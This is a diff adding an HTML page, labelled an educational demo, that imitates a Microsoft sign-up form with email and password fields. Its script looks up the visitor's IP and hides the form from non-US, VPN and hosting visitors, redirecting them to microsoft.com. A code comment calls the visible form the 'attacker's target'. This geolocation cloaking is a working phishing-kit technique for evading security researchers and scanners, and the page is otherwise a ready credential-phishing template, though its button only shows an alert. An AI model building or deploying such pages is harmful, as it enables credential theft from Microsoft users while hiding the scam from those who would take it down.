@@ -1,0 +1,80 @@
+]<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Signup Form - With Cloaking Demo (Educational)</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Segoe+UI');
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f3f2f1; }
+        .form-container { background: white; padding: 44px; border-radius: 2px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 440px; max-width: 100%; text-align: left; }
+        .header { display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 24px; }
+        .logo { width: 108px; margin-bottom: 12px; }
+        .signup-text { font-size: 24px; font-weight: 400; }
+        input { width: 100%; padding: 12px; margin: 8px 0 24px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 14px; }
+        input:focus { border-color: #0078d7; outline: none; }
+        button { width: 108px; padding: 8px 12px; background: #0078d7; color: white; border: none; border-radius: 2px; cursor: pointer; font-size: 15px; font-weight: 600; display: block; margin-left: auto; }
+        button:hover { background: #0063b1; }
+
+        /* Blocked / Cloaked Screen */
+        .blocked { text-align: center; padding: 50px; font-size: 18px; color: #333; }
+        .blocked a { color: #0078d7; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+    <!-- This div will be shown only if cloaking condition is met -->
+    <div id="blockedScreen" class="blocked" style="display:none;">
+        <h2>Access Restricted</h2>
+        <p>This service is currently available only in select regions.</p>
+        <p><a href="https://www.microsoft.com">Return to Microsoft.com</a></p>
+    </div>
+
+    <!-- Normal form - only shown to allowed visitors -->
+    <div id="mainForm" class="form-container">
+        <div class="header">
+            <img src="image1.jpg" alt="Logo" class="logo">
+            <div class="signup-text">Sign up</div>
+        </div>
+        
+        <form>
+            <input type="text" name="email" placeholder="Email" required>
+            <input type="text" name="name" placeholder="Pas***d" required>
+            <button type="button" onclick="alert('This is a demo - no data is sent')">Sign Up</button>
+        </form>
+        <p style="font-size:12px; color:#666; margin-top:20px;">
+            <strong>Educational Demo:</strong> This page uses geolocation cloaking. 
+            Only visitors from the USA (without detected VPN) see this form.
+        </p>
+    </div>
+
+    <script>
+        // Free geolocation API (ipapi.co - no key needed for basic use)
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                console.log('Detected Country:', data.country_name, '| IP:', data.ip, '| VPN/Proxy:', data.asn ? 'Possible' : 'No');
+
+                const isUSA = data.country === 'US';
+                const likelyVPN = data.hosting || data.proxy || false;  // Some APIs flag hosting/VPN
+
+                // Cloaking logic: Hide form if not USA or using VPN/proxy
+                if (!isUSA || likelyVPN) {
+                    document.getElementById('mainForm').style.display = 'none';
+                    document.getElementById('blockedScreen').style.display = 'block';
+                    
+                    // Optional: auto-redirect after delay
+                    setTimeout(() => {
+                        window.location.href = 'https://www.microsoft.com';
+                    }, 5000);
+                }
+                // If from USA and clean IP → show normal form (attacker's target)
+            })
+            .catch(err => {
+                // On error, default to showing form (or block - your choice)
+                console.log('Geo check failed:', err);
+            });
+    </script>
+</body>
+</html>
